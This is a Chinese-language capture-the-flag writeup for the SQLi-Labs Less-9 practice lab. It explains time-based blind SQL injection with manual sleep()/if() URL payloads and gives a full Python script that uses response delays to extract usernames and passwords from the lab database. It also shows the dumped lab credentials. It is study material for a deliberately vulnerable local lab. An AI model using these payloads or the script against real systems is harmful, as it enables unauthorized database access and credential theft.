【SQLi-Labs】Less-9 时间盲注与自动化 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-9 (GET - Blind - Time based - Single Quotes)
  • 提示：GET请求，基于时间的盲注，单引号闭合

2. 解题思路与前置原理

本关卡无论输入任何条件（包括 1=1 或 1=2），页面均固定回显 You are in........。布尔盲注由于缺乏页面差异而失效。

此时必须采用 时间盲注（Time-based Blind SQLi）。核心原理是利用 MySQL 的 if(条件, 成立执行, 不成立执行) 逻辑判断函数，配合 sleep(N) 延时函数。若条件成立，则强制数据库睡眠 N 秒，从而通过页面的响应时间差来判定条件的真假。

3. 操作步骤与解析

第一步：手工验证注入与延迟

在浏览器地址栏测试 Payload，观察页面加载时间：

  • ?id=1 （页面瞬间加载）
  • ?id=1' AND sleep(5) --+ （页面加载卡顿约 5 秒）
  • ?id=1' AND if(1=1, sleep(5), 0) --+ （条件为真，卡顿 5 秒）
  • ?id=1' AND if(1=2, sleep(5), 0) --+ （条件为假，瞬间加载）

解释与原理：确认了单引号闭合有效。通过对比加载时间，确认 sleep() 和 if() 函数可以正常执行，利用时间差构建判定基准。

第二步：编写 Python 自动化脚本

由于手工等待耗时极长，需编写脚本。在 VS Code 终端安装依赖库：py -m pip install requests。

核心逻辑是将二分法查找与时间判定结合。若响应时间大于 3 秒，说明条件成立（True）；否则为假（False）。

import requests
import time

url = "http://localhost/sqli-labs-master/Less-9/"
delay_threshold = 3 # 延迟阈值，大于3秒说明 sleep(5) 执行了

def get_ascii(payload):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # 时间盲注的核心：if(条件, sleep(5), 0)
        full_url = f"{url}?id=1' AND if({payload}>{mid}, sleep(5), 0) --+"
        
        start_time = time.time()
        response = requests.get(full_url)
        end_time = time.time()
        
        elapsed_time = end_time - start_time
        
        # 核心判定：如果响应时间大于阈值，说明 sleep 被执行，目标值大于 mid
        if elapsed_time > delay_threshold:
            low = mid + 1
        else:
            high = mid - 1
            
    return low

def main():
    print("[*] 开始时间盲注爆破账号密码（过程较慢，请耐心等待）...")
    result = ""
    for i in range(1, 200):
        # 截取字符并转为 ASCII
        subquery = f"ascii(substr((select group_concat(username,0x3a,password) from security.users),{i},1))"
        
        ascii_code = get_ascii(subquery)
        
        # 如果返回 0 或超出范围，说明字符串结束
        if ascii_code == 0 or ascii_code > 126:
            break
            
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i} 个字符: {char}，当前结果为: {result}")
        
    print(f"[*] 爆破完成，最终获取的数据为: {result}")

if __name__ == "__main__":
    main()

代码成分解析：

  • time.time()：获取当前时间戳，用于计算请求前后的时间差。
  • if({payload} > {mid}, sleep(5), 0)：如果 ASCII 码大于中间值，则让数据库睡眠 5 秒，否则返回 0 瞬间执行。
  • 判定逻辑：通过 elapsed_time > delay_threshold 判断是否发生了延时。如果延时，说明条件成立，目标在右半区（low = mid + 1）；否则在左半区（high = mid - 1）。

第三步：执行与结果

运行脚本后，终端成功逐个字符打印出盲注结果。当跑到 57 个字符时（Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crapp），因手动按下 Ctrl+C 终止了程序，引发了 KeyboardInterrupt 报错（属正常中断现象）。

4. 踩坑记录与实战复盘

  • 时间盲注的效率极低：每个字符的猜解都需要等待固定的延时（如 5 秒），完整获取一次全量数据可能需要数十分钟甚至数小时。在实战中，通常只爆出库名/表名或极少量样本作为漏洞存在的证明。
  • 网络波动干扰：若本地网络延迟较高，可能会误判。适当增大 sleep() 的时长和 delay_threshold 阈值（如 4-5 秒）可提高准确率。

5. 知识点总结

  • 时间盲注：在页面既无回显也无布尔差异时，利用 SQL 延时函数（sleep）与条件判断函数（if）配合，通过响应时间差推断数据。
  • Python time 模块：利用 time.time() 计算网络请求的耗时，实现时间盲注的自动化判定。
